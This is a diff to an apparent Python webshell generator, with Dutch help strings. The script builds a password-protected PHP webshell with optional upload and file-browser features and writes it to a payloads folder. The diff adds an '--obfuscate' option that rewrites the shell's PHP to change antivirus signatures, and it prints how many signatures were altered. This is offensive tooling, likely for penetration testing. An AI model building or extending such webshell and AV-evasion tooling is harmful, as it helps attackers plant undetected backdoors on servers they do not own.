@@ -10,6 +10,7 @@ parser.add_argument("password", help="wachtwoord voor webshell authenticatie")
 parser.add_argument("password_field", help="POST parameter naam voor wachtwoord", nargs="?", default="k")
 parser.add_argument("--upload", action="store_true", help="upload functionaliteit toevoegen")
 parser.add_argument("--filebrowser", action="store_true", help="file browser functionaliteit toevoegen")
+parser.add_argument("--obfuscate", action="store_true", help="PHP AV obfuscatie toepassen")
 args = parser.parse_args()
 
 print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating PHP webshell with password field '{bcolors.OKGREEN}{args.password_field}{bcolors.OKBLUE}'{bcolors.ENDC}")
@@ -35,6 +36,11 @@ if args.filebrowser:
     )
 
 shell = shell.replace("[features]", "\n".join(features))
+
+if args.obfuscate:
+    from obfuscate_av import obfuscate_text
+    shell, php_stats = obfuscate_text(shell, "php")
+    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] PHP obfuscatie: {php_stats['string']} signatures aangepast{bcolors.ENDC}")
 
 schrijven("http/payloads/shell.php", shell)
 print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Webshell geschreven naar: http/payloads/shell.php{bcolors.ENDC}")
